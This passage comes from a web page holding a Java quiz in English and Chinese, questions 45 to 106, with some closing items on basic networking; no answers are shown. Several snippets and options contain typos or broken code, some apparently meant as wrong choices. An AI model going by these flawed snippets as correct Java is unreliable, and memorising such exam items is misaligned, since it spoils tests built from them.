4;<br>G Transient int k = 4;<br>H protected int k = 4;</strong></p></blockquote><h3 id="45、-Given"><a href="#45、-Given" class="headerlink" title="45、 Given:"></a>45、 Given:</h3><pre><code>public class foo {    static String s;    public static void main(String[] args) {        System.out.println("s=" + s);    }}</code></pre><p>What is the result?</p><blockquote><p><strong>A The code compiles and “s=” is printed.</strong><br><strong>B The code compiles and “s=null” is printed.</strong><br><strong>C The code does not compile because string s is not initialized.</strong><br><strong>D The code does not compile because string s cannot be referenced.<br>E The code compiles, but a NullPointerException is thrown when toString is called.</strong></p></blockquote><h3 id="46、Which-two-create-an-instance-of-an-array"><a href="#46、Which-two-create-an-instance-of-an-array" class="headerlink" title="46、Which two create an instance of an array?"></a>46、Which two create an instance of an array?</h3><blockquote><p><strong>A int[] ia = new int [15];</strong><br><strong>B float fa = new float [20];</strong><br>**C char[] ca = “Some String”; **<br><strong>D Object oa = new float[20];<br>E Int ia [][] = (4, 5, 6) (1, 2, 3)</strong></p></blockquote><h3 id="47、Given"><a href="#47、Given" class="headerlink" title="47、Given:"></a>47、Given:</h3><pre><code>public class ExceptionTest {    class TestException extends Exception {    }    public void runTest() throws TestException {    }    public void test() /* Point X */ {        runTest();    }}</code></pre><p>At point X on line 4, which code can be added to make the code compile?</p><blockquote><p><strong>A throws Exception</strong><br><strong>B Catch (Exception e).</strong><br><strong>C Throws RuntimeException.</strong><br><strong>D Catch (TestException e).<br>E No code is necessary.</strong></p></blockquote><h3 id="48、Exhibit"><a href="#48、Exhibit" class="headerlink" title="48、Exhibit:"></a>48、Exhibit:</h3><pre><code>public class SwitchTest {    public static void main(String[] args) {        System.out.println("value =" + switchIt(4));    }    public static int switchIt(int x) {        int j = 1;        switch (x) {        case 1:            j++;        case 2:            j++;        case 3:            j++;        case 4:            j++;        case 5:            j++;        default:            j++;        }        return j + x;    }}</code></pre><p>What is the output from line 3?</p><blockquote><p><strong>A Value =3</strong><br><strong>B Value =4</strong><br><strong>C Value =5</strong><br><strong>D Value =6<br>E Value =7<br>F Value =8</strong></p></blockquote><h3 id="49、Which-four-types-of-objects-can-be-thrown-using-the-throw-statement"><a href="#49、Which-four-types-of-objects-can-be-thrown-using-the-throw-statement" class="headerlink" title="49、Which four types of objects can be thrown using the throw statement?"></a>49、Which four types of objects can be thrown using the throw statement?</h3><blockquote><p><strong>A Error</strong><br><strong>B Event</strong><br><strong>C Object</strong><br><strong>D Exception<br>E Throwable<br>F RuntimeException</strong></p></blockquote><h3 id="50．在下面程序的第-6-行补充上下列哪个方法-会导致在编译过程中发生错误"><a href="#50．在下面程序的第-6-行补充上下列哪个方法-会导致在编译过程中发生错误" class="headerlink" title="50．在下面程序的第 6 行补充上下列哪个方法,会导致在编译过程中发生错误?"></a>50．在下面程序的第 6 行补充上下列哪个方法,会导致在编译过程中发生错误?</h3><pre><code>class Super {    public float getNum() {        return 3.0f;    }}public class Sub extends Super {    （6）}</code></pre><p>A,public float getNum(){retun 4.0f;}**</p><blockquote><p><strong>B public void getNum(){}</strong><br><strong>C public void getNum(double d){}</strong><br><strong>D public double getNum(float d){ retun 4.0f ;}</strong></p></blockquote><h3 id="51-下面关于-import-class-和-package-的声明顺序哪个正确？"><a href="#51-下面关于-import-class-和-package-的声明顺序哪个正确？" class="headerlink" title="51.下面关于 import, class 和 package 的声明顺序哪个正确？( )"></a>51.下面关于 import, class 和 package 的声明顺序哪个正确？( )</h3><blockquote><p><strong>A package, import, class</strong><br><strong>B class, import, package</strong><br><strong>C import, package, class</strong><br><strong>D package, class, import</strong></p></blockquote><h3 id="52-下面哪个是正确的？"><a href="#52-下面哪个是正确的？" class="headerlink" title="52.下面哪个是正确的？( )"></a>52.下面哪个是正确的？( )</h3><blockquote><p><strong>A String temp [] = new String {“a” “b” “c”};</strong><br><strong>B String temp [] = {“a” “b” “c”}</strong><br><strong>C String temp = {“a”, “b”, “c”}</strong><br><strong>D String temp [] = {“a”, “b”, “c”}</strong></p></blockquote><h3 id="53-关于-java-lang-String-类，以下描述正确的一项是（-）"><a href="#53-关于-java-lang-String-类，以下描述正确的一项是（-）" class="headerlink" title="53.关于 java.lang.String 类，以下描述正确的一项是（ ）"></a>53.关于 java.lang.String 类，以下描述正确的一项是（ ）</h3><blockquote><p><strong>A String 类是 final 类故不可以继承；</strong><br><strong>B String 类是 final 类故可以继承；</strong><br><strong>C String 类不是 final 类故不可以继承；</strong><br><strong>D String 类不是 final 类故可以继承；</strong></p></blockquote><h3 id="54-关于实例方法和类方法，以下描述正确的是："><a href="#54-关于实例方法和类方法，以下描述正确的是：" class="headerlink" title="54.关于实例方法和类方法，以下描述正确的是：( )"></a>54.关于实例方法和类方法，以下描述正确的是：( )</h3><blockquote><p><strong>A 实例方法只能访问实例变量</strong><br><strong>B 类方法既可以访问类变量，也可以访问实例变量</strong><br><strong>C 类方法只能通过类名来调用</strong><br><strong>D 实例方法只能通过对象来调用</strong></p></blockquote><h3 id="55-接口是-Java-面向对象的实现机制之一，以下说法正确的是："><a href="#55-接口是-Java-面向对象的实现机制之一，以下说法正确的是：" class="headerlink" title="55.接口是 Java 面向对象的实现机制之一，以下说法正确的是：( )"></a>55.接口是 Java 面向对象的实现机制之一，以下说法正确的是：( )</h3><blockquote><p><strong>A Java 支持多重继承，一个类可以实现多个接口；</strong><br><strong>B Java 只支持单重继承，一个类可以实现多个接口；</strong><br><strong>C Java 只支持单重继承，一个类只可以实现一个接口；</strong><br><strong>D Java 支持多重继承，但一个类只可以实现一个接口。</strong></p></blockquote><h3 id="56-下列关于-interface-的说法正确的是："><a href="#56-下列关于-interface-的说法正确的是：" class="headerlink" title="56.下列关于 interface 的说法正确的是：( )"></a>56.下列关于 interface 的说法正确的是：( )</h3><blockquote><p><strong>A interface 中可以有 private 方法</strong><br><strong>B interface 中可以有 final 方法</strong><br><strong>C interface 中可以有 function 实现</strong><br><strong>D interface 可以继承其他 interface</strong></p></blockquote><h3 id="57-已知-A-类被打包在-packageA-B-类被打包在-packageB-，且-B-类被声明为-public-，且有一个成员"><a href="#57-已知-A-类被打包在-packageA-B-类被打包在-packageB-，且-B-类被声明为-public-，且有一个成员" class="headerlink" title="57.已知 A 类被打包在 packageA , B 类被打包在 packageB ，且 B 类被声明为 public ，且有一个成员"></a>57.已知 A 类被打包在 packageA , B 类被打包在 packageB ，且 B 类被声明为 public ，且有一个成员</h3><p>变量 x 被声明为, protected 控制方式 。C 类也位于 packageA 包，且继承了 B 类 。则以下说话<br>正确的是（ ）</p><blockquote><p><strong>A A 类的实例不能访问到 B 类的实例</strong><br><strong>B A 类的实例能够访问到 B 类一个实例的 x 成员</strong><br><strong>C C 类的实例可以访问到 B 类一个实例的 x 成员</strong><br><strong>D C 类的实例不能访问到 B 类的实例</strong></p></blockquote><h3 id="58-以下程序正确的输出是（-）"><a href="#58-以下程序正确的输出是（-）" class="headerlink" title="58.以下程序正确的输出是（ ）"></a>58.以下程序正确的输出是（ ）</h3><pre><code>package test;public class FatherClass {    public FatherClass() {        System.out.println("FatherClass Create");    }}package test;import test.FatherClass;public class ChildClass extends FatherClass {    public ChildClass() {        System.out.println("ChildClass Create");    }    public static void main(String[] args) {        FatherClass fc = new FatherClass();        ChildClass cc = new ChildClass();    }}</code></pre><blockquote><p><strong>A<br>FatherClass Create<br>FatherClass Create<br>ChildClass Create</strong><br><strong>B<br>FatherClass Create<br>ChildClass Create<br>FatherClass Create</strong><br><strong>C<br>ChildClass Create<br>ChildClass Create<br>FatherClass Create</strong><br><strong>D<br>ChildClass Create<br>FatherClass Create<br>FatherClass Create</strong></p></blockquote><h3 id="59-给定如下代码，下面哪个可以作为该类的构造函数"><a href="#59-给定如下代码，下面哪个可以作为该类的构造函数" class="headerlink" title="59.给定如下代码，下面哪个可以作为该类的构造函数 ( )"></a>59.给定如下代码，下面哪个可以作为该类的构造函数 ( )</h3><pre><code>public class Test {    …}</code></pre><blockquote><p><strong>A public void Test() {…}</strong><br><strong>B public Test() {…}</strong><br><strong>C public static Test() {…}</strong><br><strong>D public static void Test() {…}</strong></p></blockquote><h3 id="60-题目"><a href="#60-题目" class="headerlink" title="60.题目:"></a>60.题目:</h3><pre><code>1.public class test (2.    public static void main (String args[]) {3.        int i = 0xFFFFFFF1;4.        int j = ~i;5.6.    }7.)</code></pre><p>程序运行到第 5 行时,j 的值为多少?( )</p><blockquote><p><strong>A –15</strong><br><strong>B 0</strong><br><strong>C 1</strong><br><strong>D 14<br>E 在第三行的错误导致编译失败</strong></p></blockquote><h3 id="61-关于-sleep-和-wait-，以下描述错误的一项是（-）"><a href="#61-关于-sleep-和-wait-，以下描述错误的一项是（-）" class="headerlink" title="61.关于 sleep()和 wait()，以下描述错误的一项是（ ）"></a>61.关于 sleep()和 wait()，以下描述错误的一项是（ ）</h3><blockquote><p><strong>A sleep 是线程类（ThreaD 的方法，wait 是 Object 类的方法；</strong><br><strong>B sleep 不释放对象锁，wait 放弃对象锁；</strong><br><strong>C sleep 暂停线程、但监控状态仍然保持，结束后会自动恢复；</strong><br><strong>D wait 后进入等待锁定池，只有针对此对象发出 notify 方法后获得对象锁进入运行状态。</strong></p></blockquote><h3 id="62-下面能让线程停止执行的有（多选）"><a href="#62-下面能让线程停止执行的有（多选）" class="headerlink" title="62.下面能让线程停止执行的有（多选）( )"></a>62.下面能让线程停止执行的有（多选）( )</h3><blockquote><p><strong>A sleep();</strong><br><strong>B stop();</strong><br><strong>C notify();</strong><br><strong>D synchronized();<br>E yield();<br>F wait();<br>G notifyAll();</strong></p></blockquote><h3 id="63-下面哪个可以改变容器的布局？"><a href="#63-下面哪个可以改变容器的布局？" class="headerlink" title="63.下面哪个可以改变容器的布局？( )"></a>63.下面哪个可以改变容器的布局？( )</h3><blockquote><p><strong>A setLayout(aLayoutManager);</strong><br><strong>B addLayout(aLayoutManager);</strong><br><strong>C layout(aLayoutManager);</strong><br><strong>D setLayoutManager(aLayoutManager);</strong></p></blockquote><h3 id="64-下面哪个是-applet-传递参数的正确方式？（-）"><a href="#64-下面哪个是-applet-传递参数的正确方式？（-）" class="headerlink" title="64.下面哪个是 applet 传递参数的正确方式？（ ）"></a>64.下面哪个是 applet 传递参数的正确方式？（ ）</h3><blockquote><p><strong>A <applet code="Test.class" age="33" width="100" height="100"><br><strong>B <param name="age" value="33"></strong><br><strong>C <applet code="Test.class" name="age" value="33" width="100" height="100"><br><strong>D &lt;applet Test 33&gt;</strong><p></p><h3 id="65-提供-Java-存取数据库能力的包是（）"><a href="#65-提供-Java-存取数据库能力的包是（）" class="headerlink" title="65.提供 Java 存取数据库能力的包是（）"></a>65.提供 Java 存取数据库能力的包是（）</h3><blockquote><p><strong>A java.sql</strong><br><strong>B java.awt</strong><br><strong>C java.lang</strong><br><strong>D java.swing</strong></p></blockquote><h3 id="66-不能用来修饰-interface-的有（）"><a href="#66-不能用来修饰-interface-的有（）" class="headerlink" title="66.不能用来修饰 interface 的有（）"></a>66.不能用来修饰 interface 的有（）</h3><blockquote><p><strong>A private</strong><br><strong>B public</strong><br><strong>C protected</strong><br><strong>D static</strong></p></blockquote><h3 id="67-下列说法错误的有（）"><a href="#67-下列说法错误的有（）" class="headerlink" title="67.下列说法错误的有（）"></a>67.下列说法错误的有（）</h3><blockquote><p><strong>A  在类方法中可用 this 来调用本类的类方法</strong><br><strong>B  在类方法中调用本类的类方法时可直接调用</strong><br><strong>C  在类方法中只能调用本类中的类方法</strong><br><strong>D  在类方法中绝对不能调用实例方法</strong></p></blockquote><h3 id="68-从下面四段（A-B，C，D-代码中选择出正确的代码段（）"><a href="#68-从下面四段（A-B，C，D-代码中选择出正确的代码段（）" class="headerlink" title="68.从下面四段（A B，C，D 代码中选择出正确的代码段（）"></a>68.从下面四段（A B，C，D 代码中选择出正确的代码段（）</h3><blockquote><p>**A **</p></blockquote><pre><code>abstract class Name {    private String name;    public abstract boolean isStupidName(String name) {}}</code></pre><blockquote><p>**B **</p></blockquote><pre><code>public class Something {    void doSomething() {        private String s = "";        int l = s.length();    }}</code></pre><blockquote><p>**C **</p></blockquote><pre><code>public class Something {    public static void main(String[] args) {        Other o = new Other();        new Something().addOne(o);    }    public void addOne(final Other o) {        o.i++;    }}class Other {    public int i;}</code></pre><blockquote><p>**D **</p></blockquote><pre><code>public class Something {    public int addOne(final int x) {        return ++x;    }}</code></pre><h3 id="69-选择下面代码的运行结果：（）。"><a href="#69-选择下面代码的运行结果：（）。" class="headerlink" title="69.选择下面代码的运行结果：（）。"></a>69.选择下面代码的运行结果：（）。</h3><pre><code>public class Test {    public void method() {        for (int i = 0; i &lt; 3; i++) {            System.out.print(i);        }        System.out.print(i);    }}</code></pre><blockquote><p><strong>A 0122</strong><br><strong>B 0123</strong><br><strong>C 编译错误</strong><br><strong>D 没有任何输出</strong></p></blockquote><h3 id="70-请看如下代码"><a href="#70-请看如下代码" class="headerlink" title="70.请看如下代码"></a>70.请看如下代码</h3><pre><code>class Person {    private int a;    public int change(int m) {        return m;    }}public class Teacher extends Person {    public int b;    public static void main(String arg[]) {        Person p = new Person();        Teacher t = new Teacher();        int i;        // point x    }}</code></pre><p>下面哪些放在// point x?行是正确的？</p><blockquote><p>**A i = m;<br>**B i = b;<br>**C i = p.a;<br>**D i = p.change(30);<br><strong>E i = t.b;</strong></p></blockquote><h3 id="71-下面那几个函数是-public-void-method-…-的重载函数？（）"><a href="#71-下面那几个函数是-public-void-method-…-的重载函数？（）" class="headerlink" title="71 下面那几个函数是 public void method(){…}的重载函数？（）"></a>71 下面那几个函数是 public void method(){…}的重载函数？（）</h3><blockquote><p><strong>A public void method( int m){…}</strong><br><strong>B public int method(){…}</strong><br><strong>C public void method2(){…}</strong><br><strong>D public int method(int m，float f ){…}</strong></p></blockquote><h3 id="72-给出如下声明："><a href="#72-给出如下声明：" class="headerlink" title="72.给出如下声明："></a>72.给出如下声明：</h3><pre><code>String s = "Example";</code></pre><p>合法的代码由哪些？</p><blockquote><p>**A s&gt;&gt;&gt;=3 **<br>**B s[3]= “X” **<br>**C int i = s.iength() **<br><strong>D s = s +10</strong></p></blockquote><h3 id="73-如下哪些不是-java-的关键字？（-）"><a href="#73-如下哪些不是-java-的关键字？（-）" class="headerlink" title="73.如下哪些不是 java 的关键字？（ ）"></a>73.如下哪些不是 java 的关键字？（ ）</h3><blockquote><p><strong>A const</strong><br><strong>B NULL</strong><br><strong>C false</strong><br><strong>D this</strong><br><strong>E native</strong></p></blockquote><h3 id="74-已知表达式"><a href="#74-已知表达式" class="headerlink" title="74.已知表达式"></a>74.已知表达式</h3><pre><code>int m [ ] = {0，1，2，3，4，5，6}；</code></pre><p>下面哪个表达式的值与数组下标量总数相等？（ ）</p><blockquote><p><strong>A m.length()</strong><br><strong>B m.length</strong><br><strong>C m.length()+1</strong><br><strong>D m.length+1</strong></p></blockquote><h3 id="75-方法-resume-负责恢复哪些线程的执行（-）"><a href="#75-方法-resume-负责恢复哪些线程的执行（-）" class="headerlink" title="75.方法 resume()负责恢复哪些线程的执行（ ）"></a>75.方法 resume()负责恢复哪些线程的执行（ ）</h3><blockquote><p><strong>A 通过调用 stop()方法而停止的线程。</strong><br><strong>B 通过调用 sleep()方法而停止的线程。</strong><br><strong>C 通过调用 wait()方法而停止的线程。</strong><br><strong>D 通过调用 suspend()方法而停止的线程。</strong></p></blockquote><h3 id="76-有关线程的哪些叙述是对的（-）"><a href="#76-有关线程的哪些叙述是对的（-）" class="headerlink" title="76.有关线程的哪些叙述是对的（ ）"></a>76.有关线程的哪些叙述是对的（ ）</h3><blockquote><p><strong>A 一旦一个线程被创建，它就立即开始运行。</strong><br><strong>B 使用 start()方法可以使一个线程成为可运行的，但是它不一定立即开始运行。</strong><br><strong>C 当一个线程因为抢先机制而停止运行，它被放在可运行队列的前面。</strong><br><strong>D 一个线程可能因为不同的原因停止并进入就绪状态。</strong></p></blockquote><h3 id="77-已知如下代码：（-）"><a href="#77-已知如下代码：（-）" class="headerlink" title="77.已知如下代码：（ ）"></a>77.已知如下代码：（ ）</h3><pre><code>public class Test {    public static void main(String arg[]) {        int i = 5;        do {            System.out.print(i);        } while(--i&gt;5)            System.out.print("finished");    }}</code></pre><p>执行后的输出是什么？</p><blockquote><p><strong>A 5</strong><br><strong>B 4</strong><br><strong>C 6</strong><br><strong>D finished</strong></p></blockquote><h3 id="78-下面的哪些声明是合法的？（-）"><a href="#78-下面的哪些声明是合法的？（-）" class="headerlink" title="78.下面的哪些声明是合法的？（ ）"></a>78.下面的哪些声明是合法的？（ ）</h3><blockquote><p><strong>A long 1 = 4990</strong><br><strong>B int i = 4L</strong><br><strong>C float f =1.1</strong><br><strong>D double d = 34.4</strong></p></blockquote><h3 id="79-给出如下代码：（-）"><a href="#79-给出如下代码：（-）" class="headerlink" title="79.给出如下代码：（ ）"></a>79.给出如下代码：（ ）</h3><pre><code>class Test {    private int m;    public static void fun() {        // some code…    }}</code></pre><p>如何使成员变量 m 被函数 fun()直接访问？（）</p><blockquote><p><strong>A 将 private int m 改为 protected int m</strong><br><strong>B 将 private int m 改为 public int m</strong><br><strong>C 将 private int m 改为 static int m</strong><br><strong>D 将 private int m 改为 int m</strong></p></blockquote><h3 id="80-以下哪个方法用于定义线程的执行体？（）"><a href="#80-以下哪个方法用于定义线程的执行体？（）" class="headerlink" title="80.以下哪个方法用于定义线程的执行体？（）"></a>80.以下哪个方法用于定义线程的执行体？（）</h3><blockquote><p><strong>A start()</strong><br><strong>B init()</strong><br><strong>C run()</strong><br><strong>D main()<br>E synchronized()</strong></p></blockquote><h3 id="81-给出下面的代码段：（-）"><a href="#81-给出下面的代码段：（-）" class="headerlink" title="81.给出下面的代码段：（ ）"></a>81.给出下面的代码段：（ ）</h3><pre><code>public class Base {    int w, x, y, z;    public Base(int a, int b) {        x = a;        y = b;    }    public Base(int a, int b, int c, int d) {        // assignment x=a, y=b        w = d;        z = c;    }}</code></pre><p>在代码说明//assignment x=a, y=b 处写下如下哪几个代码是正确的？（）</p><blockquote><p><strong>A Base(a, b)；</strong><br><strong>B x=a, y=b；</strong><br><strong>C x=a； y=b；</strong><br><strong>D this(a，b)；</strong></p></blockquote><h3 id="82-关于运算符-gt-gt-和-gt-gt-gt-描述正确的是"><a href="#82-关于运算符-gt-gt-和-gt-gt-gt-描述正确的是" class="headerlink" title="82.关于运算符>>和>>>描述正确的是"></a>82.关于运算符&gt;&gt;和&gt;&gt;&gt;描述正确的是</h3><blockquote><p><strong>A &gt;&gt;执行移动</strong><br><strong>B &gt;&gt;执行翻转</strong><br><strong>C &gt;&gt;执行有符号左移，&gt;&gt;&gt;执行无符号左移</strong><br><strong>D &gt;&gt;执行无符号左移，&gt;&gt;&gt;执行有符号左移</strong></p></blockquote><h3 id="83-选择-Java-语言中的基本数据类型"><a href="#83-选择-Java-语言中的基本数据类型" class="headerlink" title="83. 选择 Java 语言中的基本数据类型"></a>83. 选择 Java 语言中的基本数据类型</h3><blockquote><p><strong>A byte</strong><br><strong>B Integer</strong><br><strong>C String</strong><br><strong>D char<br>E long</strong></p></blockquote><h3 id="84-从下列选项中选择正确的-Java-表达式"><a href="#84-从下列选项中选择正确的-Java-表达式" class="headerlink" title="84.从下列选项中选择正确的 Java 表达式"></a>84.从下列选项中选择正确的 Java 表达式</h3><blockquote><p><strong>A int k=new String(“aa”)</strong><br><strong>B String str=String(“bb”)</strong><br><strong>C char c=74;</strong><br><strong>D long j=8888;</strong></p></blockquote><h3 id="85-Java-I-x2F-O-程序设计中，下列描述正确的是"><a href="#85-Java-I-x2F-O-程序设计中，下列描述正确的是" class="headerlink" title="85. Java I/O 程序设计中，下列描述正确的是"></a>85. Java I/O 程序设计中，下列描述正确的是</h3><blockquote><p><strong>A OutputStream 用于写操作</strong><br><strong>B InputStream 用于写操作</strong><br><strong>C I/O 库不支持对文件可读可写 API</strong></p></blockquote><h3 id="86．下述代码的执行结果是"><a href="#86．下述代码的执行结果是" class="headerlink" title="86．下述代码的执行结果是"></a>86．下述代码的执行结果是</h3><pre><code>public class Sub extends Super {    public long getLength() {        return 5;    }    public static void main(String[] args) {        Super sooper = new Super();        Super sub = new Sub();        System.out.printIn(sooper.getLength() + "," + sub.getLength()};}</code></pre><blockquote><p><strong>A 4, 4</strong><br><strong>B 4, 5</strong><br><strong>C 5, 4</strong><br><strong>D 5, 5<br>E 代码不能被编译</strong></p></blockquote><h3 id="87、Which-two-demonstrate-a-“has-a”-relationship"><a href="#87、Which-two-demonstrate-a-“has-a”-relationship" class="headerlink" title="87、Which two demonstrate a “has a” relationship?"></a>87、Which two demonstrate a “has a” relationship?</h3><blockquote><p>**A public interface Person { }<br>public class Employee extends Person{ }<br>**<br>**B public interface Shape { }<br>public interface Rectandle extends Shape { }<br>**<br>**C public interface Colorable { }<br>public class Shape implements Colorable { }<br>**<br><strong>D public class Species{ }<br>public class Animal{private Species species;}</strong><br><strong>E interface Component{ }<br>class Container implements Component{<br>private Component[] children;<br>}</strong></p></blockquote><h3 id="88-Given-the-folowing-classes-which-of-the-following-will-compile-without-error"><a href="#88-Given-the-folowing-classes-which-of-the-following-will-compile-without-error" class="headerlink" title="88. Given the folowing classes which of the following will compile without error?"></a>88. Given the folowing classes which of the following will compile without error?</h3><pre><code>interface IFace {}class CFace implements IFace {}class Base {}public class ObRef extends Base {    public static void main(String argv[]) {        ObRef ob = new ObRef();        Base b = new Base();        Object o1 = new Object();        IFace o2 = new CFace();    }}</code></pre><blockquote><p><strong>A o1=o2;</strong><br><strong>B b=ob;</strong><br><strong>C ob=b;</strong><br><strong>D o1=b;</strong></p></blockquote><h3 id="89-关于-Java-语言，下列描述正确的是"><a href="#89-关于-Java-语言，下列描述正确的是" class="headerlink" title="89. 关于 Java 语言，下列描述正确的是"></a>89. 关于 Java 语言，下列描述正确的是</h3><blockquote><p><strong>A switch 不能够作用在 String 类型上</strong><br><strong>B List, Set, Map 都继承自 Collection 接口</strong><br><strong>C Java 语言支持 goto 语句</strong><br><strong>D GC 是垃圾收集器，程序员不用担心内存管理</strong></p></blockquote><h3 id="90-指出下列程序运行的结果"><a href="#90-指出下列程序运行的结果" class="headerlink" title="90. 指出下列程序运行的结果"></a>90. 指出下列程序运行的结果</h3><pre><code>public class Example {    String str = new String("good");    char[] ch = { 'a', 'b', 'c' };    public static void main(String args[]) {        Example ex = new Example();        ex.change(ex.str, ex.ch);        System.out.print(ex.str + " and ");        System.out.print(ex.ch);    }    public void change(String str, char ch[]) {        str = "test ok";        ch[0] = 'g';    }}</code></pre><blockquote><p><strong>A good and abc</strong><br><strong>B good and gbc</strong><br><strong>C test ok and abc</strong><br><strong>D test ok and gbc</strong></p></blockquote><h3 id="91-下列描述中，哪些符合-Java-语言的特征"><a href="#91-下列描述中，哪些符合-Java-语言的特征" class="headerlink" title="91. 下列描述中，哪些符合 Java 语言的特征"></a>91. 下列描述中，哪些符合 Java 语言的特征</h3><blockquote><p><strong>A 支持跨平台(Windows,Linux,Unix 等)</strong><br><strong>B GC(自动垃圾回收)，提高了代码安全性</strong><br><strong>C 支持类 C 的指针运算操作</strong><br><strong>D 不支持与其它语言书写的程序进行通讯</strong></p></blockquote><h3 id="92、关于异常-Exception-，下列描述正确的是"><a href="#92、关于异常-Exception-，下列描述正确的是" class="headerlink" title="92、关于异常(Exception)，下列描述正确的是"></a>92、关于异常(Exception)，下列描述正确的是</h3><blockquote><p><strong>A 异常的基类为 Exception，所有异常都必须直接或者间接继承它</strong><br><strong>B 异常可以用 try{ . . .}catch(Exception e){ . . .}来捕获并进行处理</strong><br><strong>C 如果某异常继承 RuntimeException，则该异常可以不被声明</strong><br><strong>D 异常可以随便处理，而不是抛给外层的程序进行处理</strong></p></blockquote><h3 id="93-下面的代码实现了设计模式中的什么模式"><a href="#93-下面的代码实现了设计模式中的什么模式" class="headerlink" title="93. 下面的代码实现了设计模式中的什么模式"></a>93. 下面的代码实现了设计模式中的什么模式</h3><pre><code>public class A {    private A instance;    private A() {    }    public static A getInstance    {        if (A == null)            instance = new A();        return instance;    }}</code></pre><blockquote><p><strong>A Factory</strong><br><strong>B Abstract Factory</strong><br><strong>C Singleton</strong><br><strong>D Builder</strong></p></blockquote><h3 id="94-MAX-LENGTH-是-int-型-public-成员变量，变量值保持为常量-100，用简短语句定义这个变量。"><a href="#94-MAX-LENGTH-是-int-型-public-成员变量，变量值保持为常量-100，用简短语句定义这个变量。" class="headerlink" title="94. MAX_LENGTH 是 int 型 public 成员变量，变量值保持为常量 100，用简短语句定义这个变量。"></a>94. MAX_LENGTH 是 int 型 public 成员变量，变量值保持为常量 100，用简短语句定义这个变量。</h3><blockquote><p><strong>A public int MAX_LENGTH=100;</strong><br><strong>B final int MAX_LENGTH=100;</strong><br><strong>C final public int MAX_LENGTH=100;</strong><br><strong>D public final int MAX_LENGTH=100.</strong></p></blockquote><h3 id="95"><a href="#95" class="headerlink" title="95."></a>95.</h3><pre><code>String s = new String("hello");String t = new String("hello");char c[] = { 'h', 'e', 'l', 'l', 'o' };</code></pre><p> 下列哪些表达式返回 true ?</p><blockquote><p>**A s.equals(t); **<br><strong>B t.equals(c);</strong><br><strong>C s= =t ；</strong><br><strong>D t.equals (new String(“hello”));<br>E t= = c；</strong></p></blockquote><h3 id="96-类-Teacher-和-Student-是类-Person-的子类"><a href="#96-类-Teacher-和-Student-是类-Person-的子类" class="headerlink" title="96. 类 Teacher 和 Student 是类 Person 的子类;"></a>96. 类 Teacher 和 Student 是类 Person 的子类;</h3><pre><code>Teacher t;Student s;// t and s are all non-null.if(t instanceof Person){    s = (Student) t;}</code></pre><p>最后一条语句的结果是:</p><blockquote><p><strong>A 将构造一个 Student 对象;</strong><br><strong>B 表达式是合法的；</strong><br><strong>C 表达式是错误的；</strong><br><strong>D 编译时正确, 但运行时错误。</strong></p></blockquote><h3 id="97-关于线程设计，下列描述正确的是"><a href="#97-关于线程设计，下列描述正确的是" class="headerlink" title="97. 关于线程设计，下列描述正确的是"></a>97. 关于线程设计，下列描述正确的是</h3><blockquote><p><strong>A 线程对象必须实现 Runnable 接口</strong><br><strong>B 启动一个线程直接调用线程对象的 run()方法</strong><br><strong>C Java 提供对多线程同步提供语言级的支持</strong><br><strong>D 一个线程可以包含多个进程</strong></p></blockquote><h3 id="98-欲构造-ArrayList-类得一个实例，此类继承了-List-接口，下列哪个方法是正确的："><a href="#98-欲构造-ArrayList-类得一个实例，此类继承了-List-接口，下列哪个方法是正确的：" class="headerlink" title="98. 欲构造 ArrayList 类得一个实例，此类继承了 List 接口，下列哪个方法是正确的："></a>98. 欲构造 ArrayList 类得一个实例，此类继承了 List 接口，下列哪个方法是正确的：</h3><blockquote><p><strong>A ArrayList myList = new Object();</strong><br><strong>B List myList = new ArrayList();</strong><br><strong>C ArraylList myList = new List();</strong><br><strong>D List myList = new List();</strong></p></blockquote><h3 id="99．关于线程设计，下列描述正确的是"><a href="#99．关于线程设计，下列描述正确的是" class="headerlink" title="99．关于线程设计，下列描述正确的是"></a>99．关于线程设计，下列描述正确的是</h3><blockquote><p><strong>A 线程对象必须实现 Runnable 接口</strong><br><strong>B 启动一个线程直接调用线程对象的 run()方法</strong><br><strong>C Java 提供对多线程同步提供语言级的支持</strong><br><strong>D 一个线程可以包含多个进程</strong></p></blockquote><h3 id="100-以下各-DOS-命令能够显示出本机-DNS-服务器地址的是："><a href="#100-以下各-DOS-命令能够显示出本机-DNS-服务器地址的是：" class="headerlink" title="100.以下各 DOS 命令能够显示出本机 DNS 服务器地址的是：( )"></a>100.以下各 DOS 命令能够显示出本机 DNS 服务器地址的是：( )</h3><blockquote><p><strong>A ping -a</strong><br><strong>B ipconfig -all</strong><br><strong>C netstat</strong><br><strong>D telnet</strong></p></blockquote><h3 id="101-下列-IP-地址中，属于-C-类-IP-地址的是"><a href="#101-下列-IP-地址中，属于-C-类-IP-地址的是" class="headerlink" title="101.下列 IP 地址中，属于 C 类 IP 地址的是( )"></a>101.下列 IP 地址中，属于 C 类 IP 地址的是( )</h3><blockquote><p><strong>A 201.222.1.65</strong><br><strong>B 10.2.1.1</strong><br><strong>C 127.63.2.99</strong><br><strong>D 255.255.255.255</strong></p></blockquote><h3 id="102-在使用匿名登录-ftp-时，用户名为-？"><a href="#102-在使用匿名登录-ftp-时，用户名为-？" class="headerlink" title="102.在使用匿名登录 ftp 时，用户名为( )？"></a>102.在使用匿名登录 ftp 时，用户名为( )？</h3><blockquote><p><strong>A login users</strong><br><strong>B anonymous</strong><br><strong>C root</strong><br><strong>D guest</strong></p></blockquote><h3 id="103-管理计算机通信的规则称为"><a href="#103-管理计算机通信的规则称为" class="headerlink" title="103.管理计算机通信的规则称为"></a>103.管理计算机通信的规则称为</h3><blockquote><p><strong>A 协议</strong><br><strong>B 介质</strong><br><strong>C 服务</strong><br><strong>D 网络操作系统</strong></p></blockquote><h3 id="104-TCP-通信建立在连接的基础上，TCP-连接的建立要使用几次握手的过程。"><a href="#104-TCP-通信建立在连接的基础上，TCP-连接的建立要使用几次握手的过程。" class="headerlink" title="104.TCP 通信建立在连接的基础上，TCP 连接的建立要使用几次握手的过程。"></a>104.TCP 通信建立在连接的基础上，TCP 连接的建立要使用几次握手的过程。</h3><blockquote><p><strong>A 2</strong><br><strong>B 3</strong><br><strong>C 4</strong><br><strong>D 5</strong></p></blockquote><h3 id="105-路由器工作在-ISO-x2F-OSI-参考模型的"><a href="#105-路由器工作在-ISO-x2F-OSI-参考模型的" class="headerlink" title="105.路由器工作在 ISO/OSI 参考模型的"></a>105.路由器工作在 ISO/OSI 参考模型的</h3><blockquote><p><strong>A 数据链路层</strong><br><strong>B 网络层</strong><br><strong>C 传输层</strong></p></blockquote><h3 id="106-OSI-体系结构定义了一个几层模型。"><a href="#106-OSI-体系结构定义了一个几层模型。" class="headerlink" title="106.OSI 